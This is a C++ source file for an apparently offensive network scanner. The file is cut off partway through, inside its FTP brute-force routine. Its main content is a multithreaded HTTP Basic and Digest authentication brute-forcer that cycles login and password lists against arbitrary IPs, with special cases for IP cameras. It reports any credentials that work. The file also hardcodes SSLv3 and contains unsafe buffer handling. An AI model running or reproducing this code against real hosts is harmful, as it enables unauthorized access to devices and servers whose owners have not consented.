#pragma once
#include "STh.h"
#include <libssh/libssh.h>
#include <sstream>
#include <openssl/md5.h>
#include "mainResources.h"
#include "externFunctions.h"
#include "externData.h"
#include <openssl/err.h>
#include <Utils.h>

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
#include <iphlpapi.h>
#include <icmpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#endif
int gMaxBrutingThreads = 200;
fd_set write_fs;


int _countFTPDirectories(char *recvBuff){
	if(strcmp(recvBuff, "dummy\r\n") == 0) return 0;
	int dirCounter = 0;
	if(recvBuff[strlen(recvBuff) - 1] != '\n') strcat(recvBuff, "\n");
	char *dirPtr = strstr(recvBuff, "\n");
	while(dirPtr != NULL){
		++dirCounter;
		dirPtr = strstr(dirPtr + 1, "\n");
	};
	return dirCounter;
}

void BConInc()
{
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
__asm
    {
        lock inc BrutingThrds;
    };
#else
    asm("lock incl BrutingThrds");
#endif

	stt->doEmitionChangeBA(QString::number(BrutingThrds));
}

void BConDec()
{
	if(BrutingThrds > 0)
	{
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    __asm
        {
            lock dec BrutingThrds;
        };
#else
        asm("lock decl BrutingThrds");
#endif
	}

	stt->doEmitionChangeBA(QString::number(BrutingThrds));

}

bool debugWriteWait = false;
void _DebugWriteHTMLToFile(char *request, char *buff)
{
	while(debugWriteWait) Sleep(50);
	debugWriteWait = true;
	FILE *df = fopen("./debugData.txt", "a");

	if(df != NULL)
	{
		fputs(request, df);
		fputs("==========================\n", df);
		fputs(buff, df);
		fputs("\n==========================\n==========================\n\n", df);
		fclose(df);
	}
	else
	{
		stt->doEmitionRedFoundData("[DEBUG] Cannot open debugData.txt");
	};
	debugWriteWait = false;
}

unsigned char tl(unsigned char d)
{
	if(d >= 192 && d <= 223)
    {
        return (unsigned char)(d + 32);
	}
	else 
	{
		return tolower(d);
	};
}

int recvWT( 
	int Socket, 
	char *Buffer, 
	int Len, 
	long Timeout, 
	int *bTimedOut 
	){ 
		fd_set ReadSet; 
		int n;
		struct timeval Time; 

		FD_ZERO(&ReadSet); 
		FD_SET(Socket,&ReadSet); 
		Time.tv_sec = Timeout; 
		Time.tv_usec = 0; 
        *bTimedOut = false;
		n = select(Socket+1,&ReadSet,NULL,NULL,&Time); 
		if (n > 0) { /* got some data */ 
			return recv(Socket,Buffer,Len,0); 
		} 
		if (n == 0) { /* timeout */ 
            *bTimedOut = true;
		} 
		return(n) ; /* trouble */ 
}

std::string toLowerStr(const char *str)
{
    if(str != NULL) {
        int tsz = strlen(str);
        char *strr = new char[tsz+1];
        ZeroMemory(strr, tsz);

        for (int i = 0; i < tsz; i++)
        {
            strr[i] = tl(str[i]);
        };

        memset(strr + tsz, '\0', 1);

        std::string tstr = std::string(strr);
        delete []strr;
        return tstr;
    } else return "";

//    if(tsz == 1)
//	{
//		if(str[0] == 10) return "[No data!]";
//		else return str;
//	}
//	else if(tsz > 1)
//	{
//		char * strr = new char[tsz+1];
//		ZeroMemory(strr, tsz);

//		for (int i = 0; i < tsz; i++)
//		{
//			strr[i] = tl(str[i]);
//		};

//		memset(strr + tsz, '\0', 1);

//		std::string tstr = strr;
//		delete []strr;
//		return tstr;
//	};
//	return "";
}

int OpenConnection(SOCKET *sock, const char *hostname, int port)
{   
	struct hostent *host;
	struct sockaddr_in addr;
	if(strlen(hostname) == 0) 
	{
		return -1;
	};
	if(port < 0 || port > 65535) 
	{
		return -1;
	};

	if ( (host = gethostbyname(hostname)) == NULL )
	{
		++offlines;
		if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(hostname) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(hostname) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
		return -1;
	};
	*sock = socket(PF_INET, SOCK_STREAM, 0);
	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = *(long*)(host->h_addr);
	if ( connect(*sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR )
	{
		++offlines;
		CSSOCKET(*sock);
		return -1;
	};
	return 0;
}

void _baSSLWorker(char *ip, char *request, char *rvBuff)
{
	const SSL_METHOD *method = SSLv3_client_method();  /* Create new client-method instance */
	SSL_CTX *ctx = SSL_CTX_new(method);   /* Create new context */

	if(ctx != NULL)
	{
		SOCKET sock;
		SSL_CTX_set_timeout(ctx, gTimeOut);
		int result = OpenConnection(&sock, ip, 443);
		if(result >= 0)
		{
			SSL *ssl = NULL;
			ssl = SSL_new(ctx);      /* create new SSL connection state */
			if(ssl != NULL)
			{
				SSL_set_fd(ssl, sock);    /* attach the socket descriptor */
				if(SSL_connect(ssl))
				{
					SSL_write(ssl, request, strlen(request));
					if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));

					char tempBuff[128] = {0};
					int x = 1;
					int xx = 0;

					ZeroMemory(rvBuff, sizeof(rvBuff));
					while(xx < 512)
					{
						x = SSL_read(ssl, tempBuff, sizeof(tempBuff));
						if(x <= 0) break;
						Activity += x;
						xx += x;
						strncat(rvBuff, tempBuff, x);
						ZeroMemory(tempBuff, sizeof(tempBuff));
					};

					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(rvBuff));
					if(HTMLDebugMode) _DebugWriteHTMLToFile(request, rvBuff);
				};
				SSL_shutdown(ssl);
				SSL_free(ssl);
				CSSOCKET(sock);
				SSL_CTX_free(ctx);        /* release context */
				return;
			};
		};		
		CSSOCKET(sock);
		SSL_CTX_free(ctx);        /* release context */
	}
	else
	{
		char buff1[512] = {0};
		char buff2[512] = {0};
		
		ERR_error_string(ERR_peek_error(), buff1);
		ERR_error_string(ERR_peek_last_error(), buff2);
		stt->doEmitionRedFoundData(QString(ip) + " SSL(InitCTX) 1:" + QString(buff1) + " 2:" + QString(buff2));
	};
}

char *_getAttributeValue(char *str, char *val, char *ip, int port)
{
	char res[1024] = {0};
	char *ptrStart = NULL; 
	char *ptrS1End = NULL;
	char *ptrS2End = NULL;

	ptrStart = strstri(str, val);
	if(ptrStart != NULL)
	{
		if(strstri(ptrStart, "qop=auth") != NULL) return "auth";
		ptrS1End = _findFirst(ptrStart, "\"");
		if(ptrS1End != NULL)
		{
			ptrS2End = _findFirst(ptrS1End + 1, "\"");
			if(ptrS2End != NULL)
			{
				int sz = ptrS2End - ptrS1End - 1;

				if(sz != 0 && sz < 1024) strncpy(res, ptrS1End + 1, sz);
				else return "";

				return res;
			}
			else
			{
				stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
				return "";				
			};
		}
		else
		{
			stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#919121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
			return "";				
		};
	}
	else
	{
		stt->doEmitionRedFoundData("[_getAttributeValue] Error retrieving value: \"" + QString(val) + "\" IP:<a style=\"color:#819121;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\">" + QString(ip) + ":" + QString::number(port) + "</a>");
		return "";
	};
}

#define HASHLEN 16
typedef char HASH[HASHLEN];
#define HASHHEXLEN 32
typedef char HASHHEX[HASHHEXLEN+1];
#define IN
#define OUT
void CvtHex(
    IN HASH Bin,
    OUT HASHHEX Hex
    )
{
    unsigned short i;
    unsigned char j;

    for (i = 0; i < HASHLEN; i++) {
        j = (Bin[i] >> 4) & 0xf;
        if (j <= 9)
            Hex[i*2] = (j + '0');
         else
            Hex[i*2] = (j + 'a' - 10);
        j = Bin[i] & 0xf;
        if (j <= 9)
            Hex[i*2+1] = (j + '0');
         else
            Hex[i*2+1] = (j + 'a' - 10);
    };
    Hex[HASHHEXLEN] = '\0';
};
char *_makeDigestResponse(
	char *login, 
	char *realm, 
	char *pass, 
	char *path, 
	char *nonce,
	char *pszNonceCount,
	char *pszCNonce,
	char *pszQop
	)
{
	char HA1[MD5_DIGEST_LENGTH];
	char HA2[MD5_DIGEST_LENGTH];
	char HA1Data[512] = {0};
	char HA2Data[512] = {0};

	strcpy(HA1Data, login);
	strcat(HA1Data, ":");
	strcat(HA1Data, realm);
	strcat(HA1Data, ":");
	strcat(HA1Data, pass);

	strcpy(HA2Data, "GET:");
	strcat(HA2Data, path);

	MD5((unsigned char*) HA1Data, strlen(HA1Data), (unsigned char*)HA1);
	MD5((unsigned char*) HA2Data, strlen(HA2Data), (unsigned char*)HA2);

	char responseData[512] = {0};
	char *HA1MD5 = new char[64];
	char *HA2MD5 = new char[64];
	ZeroMemory(HA1MD5, 64);
	ZeroMemory(HA2MD5, 64);

	CvtHex(HA1, HA1MD5);
	strcpy(responseData, HA1MD5);
	strcat(responseData, ":");
	strcat(responseData, nonce);
	strcat(responseData, ":");
	if (*pszQop != NULL) {
		strcat(responseData, pszNonceCount);
		strcat(responseData, ":");
		strcat(responseData, pszCNonce);
		strcat(responseData, ":");
		strcat(responseData, pszQop);
		strcat(responseData, ":");
      };
	CvtHex(HA2, HA2MD5);
	strcat(responseData, HA2MD5);
	delete []HA1MD5;
	delete []HA2MD5;

	char response[MD5_DIGEST_LENGTH];
	MD5((unsigned char*) responseData, strlen(responseData), (unsigned char*)response);
	char responseMD5[64] = {0};
	CvtHex(response, responseMD5);
	return (char*)responseMD5;
}

lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
{
	if(strcmp(method, "[DIGEST]") != 0 && strcmp(method, "[NORMAL]") != 0) stt->doEmitionRedFoundData("[-] Unknown method IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + + "</a>"); 
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	int cookieLen = strlen(cookie);
	char path[512] = {0};
	strncpy(path, pathT, 512);

	int bTO;
	bool goon = false;
	char hRqst[REQUEST_MAX_SIZE] = {0};
	char headerMsg[REQUEST_MAX_SIZE] = { 0 };
	char hMsgR[512] = {0};

	strcpy(hRqst, "GET ");
	strcat(hRqst, path);
	strcat(hRqst, " HTTP/1.1\r\nHost: ");
	strcat(hRqst, ip);

	if(port != 80){
		strcat(hRqst, ":");
		char tbuff[16] = {0};
        sprintf(tbuff, "%d", port);
        strcat(hRqst, tbuff);
	};

	if(cookieLen != 0)
	{
		strcat(hRqst, "\r\nCookie: ");
		strcat(hRqst, cookie);
	};
	strcat(hRqst, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic bG9sa2E6bG9sa2F=\r\n\r\n");
	
    sockaddr_in sockAddr;
	if(port == 443)
	{
		ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
		_baSSLWorker(ip, hRqst, headerMsg);
	}

    else
	{
		SOCKET sock;
		sockAddr.sin_family = AF_INET;
		sockAddr.sin_port = htons(port);
		HOSTENT *host;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
		else
		{
			isActive = 0;
			strcpy(lps.login, "UNKNOWN");
			return lps;
		};
#else
		if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
		else
		{
			isActive = 0;
			strcpy(lps.login, "UNKNOWN");
			return lps;
		};
#endif
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		if(sock != INVALID_SOCKET) {

			if(connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr)) != SOCKET_ERROR) {

				if(send(sock, hRqst, strlen(hRqst), 0) != SOCKET_ERROR) {

					if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(hRqst));
					ZeroMemory(headerMsg, REQUEST_MAX_SIZE);
					int x = 1;
					int xx = 0;

					while (xx < REQUEST_MAX_SIZE)
					{
						x = recvWT(sock, hMsgR, sizeof(hMsgR), gTimeOut + 5, &bTO);
						if(x <= 0) break;
						strncat(headerMsg, hMsgR, x);
						xx += x;
						ZeroMemory(hMsgR, sizeof(hMsgR));
					};

					if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(headerMsg));
				} else {
					if(gDebugMode) stt->doEmitionDebugFoundData("[BA::Send]: " + QString::number(WSAGetLastError()));
				};
			} else {
				if(gDebugMode) stt->doEmitionDebugFoundData("[BA::Connect]: " + QString::number(WSAGetLastError()));
			};
		} else {
			if(gDebugMode) stt->doEmitionDebugFoundData("[BA: Invalid socket]: " + QString::number(WSAGetLastError()));
		};
		CSSOCKET(sock);
	};

	

	if(strlen(headerMsg) == 0)
	{
		isActive = 0;

		strcpy(lps.login, "UNKNOWN");
		return lps;
	};

	if(strstr(headerMsg, "401 ") == NULL 
		&& strstr(headerMsg, ".1 401") == NULL 
		&& strstr(headerMsg, ".0 401") == NULL
		&& strstr(headerMsg, "<statusValue>401</statusValue>") == NULL
		&& strstr(headerMsg, "<statusString>Unauthorized</statusString>") == NULL
		&& strstr(headerMsg, "неправильны") == NULL && strstr(headerMsg, "Неправильны") == NULL
		&& strstr(headerMsg, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL
		)
	{
		if(strstri(headerMsg, "400 Bad") != NULL)
		{
			strcpy(lps.other, "[400 Bad Request]");
			isActive = 0;
			return lps;
		}
		else if(strstri(headerMsg, "404 Not") != NULL 
			|| strstr(headerMsg, "404 ") != NULL 
			|| strstr(headerMsg, ".1 404") != NULL 
			|| strstr(headerMsg, ".0 404") != NULL
			)
		{
			if(strstr(path, "/axis-cgi/com/ptz.cgi?") != NULL)
			{
				int sz = strlen("/view/viewer_index.shtml");
				strncpy(path, "/view/viewer_index.shtml", sz);
				memset(path + sz, 0, 1);
				goon = true;
			}
			else
			{
				strcpy(lps.other, QString("[404 Not Found (" + QString(path) + ")]").toLocal8Bit().data());
				isActive = 0;
				return lps;
			};
		}
		else if(															//
			(strstr(headerMsg, ".1 403") != NULL							//
			|| strstr(headerMsg, ".0 403") != NULL							//Hikkvision2
			)																//
			&& strstr(headerMsg, "badAuthorization") != NULL				//
			)
		{
			goon = true;
		}
		else if(strlen(headerMsg) < 16)
		{
			goon = true;
			stt->doEmitionRedFoundData("Corrupted reply: (" + QString(headerMsg) + ") " + QString(ip) + ":"+ QString::number(port));
		};

		if(goon == false)
		{
			strcpy(lps.login, "NULL");
			strcpy(lps.pass, "NULL");
			isActive = 0;
			return lps;
		};
	};


	isActive = 1;
	char tPass[256] = {0};
	char curLogin[256] = {0};
	char curPass[256] = {0};
    int cCode;
	int dataSz = 0;
	char request[REQUEST_MAX_SIZE] = {0};
	char recvBuff[4096] = {0};
	char recvBuff2[512] = {0};
    char pass[256] = {0};

	char localBuff[4096] = {0};
	strcpy(localBuff, headerMsg);
	int passCounter = 1;
	char attribute[2048] = {0};
	char nonce[512] = {0};
	char realm[512] = {0};
	char opaque[512] = {0};
	char qop[64] = {0};
	std::string encoded = "";

	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		for (int j = 0; j < MaxPass; j++)
		{
			if (globalScanFlag == false) break;

			ZeroMemory(request, REQUEST_MAX_SIZE);
			ZeroMemory(curLogin, sizeof(curLogin));
			ZeroMemory(curPass, sizeof(curPass));
			strcpy(curLogin, loginLst[i]);
			strcpy(curPass, passLst[j]);

			if (strcmp(method, "[DIGEST]") == 0 && strstr(localBuff, "nonce=") != NULL)
			{
				ZeroMemory(attribute, sizeof(attribute));
				strcpy(attribute, _getAttribute(localBuff, "WWW-Authenticate:"));
				ZeroMemory(nonce, sizeof(nonce));
				strcpy(nonce, _getAttributeValue(attribute, "nonce=", ip, port));
				ZeroMemory(realm, sizeof(realm));
				strcpy(realm, _getAttributeValue(attribute, "realm=", ip, port));
				ZeroMemory(qop, sizeof(qop));
				if (strstri(attribute, "qop") != NULL)
				{
					strcpy(qop, _getAttributeValue(attribute, "qop=", ip, port));
				};

				strcpy(request, "GET ");
				strcat(request, path);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if (port != 80){
					strcat(request, ":");
					char tbuff[16] = { 0 };
					sprintf(tbuff, "%d", port);
					strcat(request, tbuff);
				};
				if (cookieLen != 0)
				{
					strcat(request, "\r\nCookie: ");
					strcat(request, cookie);
				};

				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Digest username=\"");
				strcat(request, curLogin);
				strcat(request, "\", realm=\"");
				strcat(request, realm);
				strcat(request, "\", nonce=\"");
				strcat(request, nonce);
				strcat(request, "\", uri=\"");
				strcat(request, path);
				strcat(request, "\", qop=auth, response=\"");
				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce, "10000001", "9d531d56796e0dc9", qop));
				if (strstri(attribute, "opaque") != NULL)
				{
					ZeroMemory(opaque, sizeof(opaque));
					strcpy(opaque, _getAttributeValue(attribute, "opaque=", ip, port));
					strcat(request, "\", opaque=\"");
					strcat(request, opaque);
				};
				strcat(request, "\", nc=10000001, cnonce=\"9d531d56796e0dc9\"");
				strcat(request, "\r\nConnection: close\r\n\r\n");
			}
			else
			{
				ZeroMemory(tPass, sizeof(tPass));
				strncpy(tPass, curLogin, strlen(curLogin));
				strcat(tPass, ":");
				strncat(tPass, curPass, strlen(curPass));
				encoded = base64_encode((const unsigned char *)tPass, strlen(tPass));
				strcpy(request, "GET ");
				strcat(request, path);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if (port != 80){
					strcat(request, ":");
					char tbuff[16] = { 0 };
					sprintf(tbuff, "%d", port);
					strcat(request, tbuff);
				};
				if (cookieLen != 0)
				{
					strcat(request, "\r\nCookie: ");
					strcat(request, cookie);
				};

				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nAuthorization: Basic ");
				strcat(request, encoded.c_str());
				strcat(request, "\r\nConnection: close\r\n\r\n");
			};

			if (port == 443)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				if (BALogSwitched) stt->doEmitionBAData("Probing SSL:BA " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(tPass) + ";");
				_baSSLWorker(ip, request, recvBuff);
				dataSz = strlen(recvBuff);
			}

			else
			{
				SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));

				if (cCode == SOCKET_ERROR) {

					int errorCode = WSAGetLastError();
					if (errorCode == WSAENOTSOCK) {

						while (errorCode == WSAENOTSOCK)
						{
							if (gDebugMode) stt->doEmitionDebugFoundData("[BA][ENOTSOCK] - [" + QString(ip) + ":" + QString::number(port) + "]");
							CSSOCKET(sock);
							sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
							cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
							errorCode = WSAGetLastError();
						};
					}
					else {

						CSSOCKET(sock);

						if (errorCode != WSAETIMEDOUT)
						{
							stt->doEmitionRedFoundData("[BA] Cannot connect to " + QString(ip) + "[" + QString::number(errorCode) + "]");
						};

						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
				}
				else {

					int x = 1;
					Activity += strlen(request);

					if (send(sock, request, strlen(request), 0) != SOCKET_ERROR)
					{
						if (MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
						dataSz = 0;
						ZeroMemory(recvBuff2, sizeof(recvBuff2));
						ZeroMemory(recvBuff, sizeof(recvBuff));
						while (x > 0 && dataSz < 3384)
						{
							ZeroMemory(recvBuff2, sizeof(recvBuff2));
							x = recvWT(sock, recvBuff2, sizeof(recvBuff2), gTimeOut + 5, &bTO);

							dataSz += x;
							Activity += x;
							strncat(recvBuff, recvBuff2, x);
						};
						if (BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
					}
					else
					{
						stt->doEmitionRedFoundData("[BA] Send error! [" + QString(ip) + "]");

						CSSOCKET(sock);
						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					}
				};
				CSSOCKET(sock);
			};


			if (MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff));

			if (dataSz == 0)
			{
				stt->doEmitionBAData("[BA] No reply from: " + QString(ip) + "; Repeating...");
				--j;
				continue;
			}
			else
			{
				++passCounter;
			};

			if (strcmp(method, "[DIGEST]") == 0)
			{
				ZeroMemory(localBuff, sizeof(localBuff));
				strcpy(localBuff, recvBuff);
			};
			if (strstri(recvBuff, "http/1.1 401") != NULL
				|| strstri(recvBuff, "http/1.0 401") != NULL
				|| (strstri(recvBuff, "200 ok") != NULL 
				&& strstri(recvBuff, "<statusValue>401</statusValue>") != NULL
				&& strstri(recvBuff, "<statusString>Unauthorized</statusString>") != NULL)
				)
			{
				Sleep(200);
			} else
			//if(strstri(recvBuff, "http/1.1 401") == NULL
			//	|| strstri(recvBuff, "http/1.0 401") == NULL
			//	)
			//{
			//	if ((strstri(recvBuff, "200 ok") != NULL
			//		|| strstri(recvBuff, "http/1.0 200") != NULL
			//		|| strstri(recvBuff, "http/1.1 200") != NULL
			//		)
			//		&& strstr(headerMsg, "неправильны") == NULL 
			//		&& strstr(headerMsg, "Неправильны") == NULL
			//		&& strstr(headerMsg, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL)
			//	{
			//	}
			//	stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");
			//	Sleep(200);
			//	///dummy///
			//}
			if(strstri(recvBuff, "503 service unavailable") != NULL 
				|| strstri(recvBuff, "http/1.1 503") != NULL 
				|| strstri(recvBuff, "http/1.0 503") != NULL
				|| strstr(recvBuff, "400 BAD_REQUEST") != NULL
				|| strstri(recvBuff, "400 bad request") != NULL
				|| strstr(recvBuff, "403 Forbidden") != NULL
				)
			{
				stt->doEmition_BARedData("[.] 503/400/403 - Waiting 30sec (" + QString(ip) + ":" + QString::number(port) + ")");

				if(j > 0) --j;
				Sleep(30000);
			}
			else if((strstri(recvBuff, "http/1.1 404") != NULL 
				|| strstri(recvBuff, "http/1.0 404") != NULL
				) 
				&& strstri(recvBuff, "Authorization required") == NULL
				)
			{
				if(HTMLDebugMode) _DebugWriteHTMLToFile(request, recvBuff);

				if (i > 0 || j > 0) stt->doEmitionYellowFoundData("[?] Unexpected 404. Check <u>" + QString(ip) + ":" + QString::number(port) + " l/p:" + QString(tPass) + "</u> manually. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");
				else stt->doEmitionRedFoundData("[-] 404 - Wrong path detected. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");

				isActive = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			}
			else if ((strstri(recvBuff, "200 ok") != NULL
				|| strstri(recvBuff, "http/1.0 200") != NULL
				|| strstri(recvBuff, "http/1.1 200") != NULL
				)
				&& strstri(recvBuff, "http/1.1 401 ") == NULL
				&& strstri(recvBuff, "http/1.0 401 ") == NULL
				&& strstri(recvBuff, "<statusValue>401</statusValue>") == NULL
				&& strstri(recvBuff, "<statusString>Unauthorized</statusString>") == NULL
				&& strstri(recvBuff, "неправильны") == NULL
				&& strstri(recvBuff, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL
				&& dataSz > 13
				) 
			{
				if(strstri(recvBuff, "access is denied") == NULL 
					&& strstri(recvBuff, "iisstart") == NULL 
					&& strstri(recvBuff, "Location:") == NULL
					&& strstri(recvBuff, "access forbidden") == NULL
					)
				{
					ZeroMemory(pass, sizeof(pass));
					strcpy(pass, ip);
					strcat(pass, " - Password found: ");
					strcat(pass, tPass);
					isActive = 0;
					stt->doEmition_BAGreenData("[+] " + QString(pass));
					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);
					return lps;
				};
			}
			else
			{
				if (strstri(recvBuff, "неправильны") == NULL
					&& strstri(recvBuff, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == NULL)
				{
					ZeroMemory(pass, sizeof(pass));
					sprintf(pass, "%s - Password found: %s", ip, tPass);
					char *pt1 = strstr(recvBuff, " ");
					if(pt1 != NULL)
					{
						char *pt2 = strstr(pt1 + 1, " ");
						if(pt2 != NULL)
						{
							int sz = pt2 - pt1 - 1;
							char tempHeaderCode[16] = {0};
							strncpy(tempHeaderCode, pt1 + 1, sz);
						
							if(strcmp(tempHeaderCode, "302") == 0 && strcmp(tempHeaderCode, "200") == 0) stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (" + QString(tempHeaderCode) + ") IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");
							strcpy(lps.login, curLogin);
							strcpy(lps.pass, curPass);
							return lps;
						};
					};
					stt->doEmitionYellowFoundData("[+] No/unexpected HTTP header detected (?) IP: <a style=\"color: #efe100;\" href=\"http://" + QString(ip) + ":" + QString::number(port) + "\">" + QString(ip) + ":" + QString::number(port) + "</a>");						
					strcpy(lps.login, curLogin);
					strcpy(lps.pass, curPass);
					isActive = 0;
					return lps;
				}
				else Sleep(200);
			};

			if(strstr(recvBuff, "Set-Cookie:") != NULL)
			{
				ZeroMemory(cookie, COOKIE_MAX_SIZE);
				strncpy(cookie, _getAttribute(recvBuff, "Set-Cookie:"), COOKIE_MAX_SIZE);
				cookieLen = strlen(cookie);
			};
		};
	};

	isActive = 0;

	strcpy(lps.login, "UNKNOWN");
	return lps;
}

lopaStr _BALobby(char *cookie, char *ip, int port, char *path, char *method)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);
	
	BConInc();
	lopaStr res = _BABrute(cookie, ip, port, path, method);
	BConDec();
	
	return res;
}

lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	char recvBuff[1024] = {0}, request[64] = {0};
	sockaddr_in sockAddr;  
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		strcpy(lps.login, "UNKNOWN");
		return lps;
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		strcpy(lps.login, "UNKNOWN");
		return lps;
	};
#endif

	bool breakPassLoop = 0;
	int passCounter = 1;
	int bTO;
	int x = 0;
	int connectionResult, closedSocket = 1, loginFailedFlag = 0; 

	SOCKET sockFTP;
	for(int i = 0; i < MaxLogin; ++i)
	{
		if(globalScanFlag == false) break;
		if(strlen(loginLst[i]) <= 1) continue;

		for(int j = 0; j < MaxPass; ++j)
		{
			if(globalScanFlag == false) break;
			if(strlen(passLst[j]) <= 1) continue;
		
			if(closedSocket)
			{
				closedSocket = 0;
				sockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				connectionResult = connect(sockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));

